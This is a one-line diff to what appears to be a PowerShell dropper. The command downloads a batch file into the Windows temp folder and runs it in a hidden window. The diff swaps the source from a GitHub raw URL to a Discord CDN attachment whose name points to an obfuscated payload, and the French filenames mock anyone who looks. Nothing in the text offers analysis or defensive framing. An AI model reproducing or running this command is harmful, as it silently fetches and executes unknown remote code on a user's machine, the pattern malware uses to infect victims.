@@ -1,1 +1,1 @@
-iwr -useb https://raw.githubusercontent.com/dazd-pkz/shit-stuff/main/ceciestunexemplecherchespaslaheyVIRGULEyarienavoir.bat -o $env:TEMP\tesconouquoimec.bat; saps $env:TEMP\tesconouquoimec.bat -WindowStyle Hidden
+iwr -useb https://cdn.discordapp.com/attachments/1074713687778152552/1086268052661878835/startobfobfusc-obf.bat -o $env:TEMP\tesconouquoimec.bat; saps $env:TEMP\tesconouquoimec.bat -WindowStyle Hidden
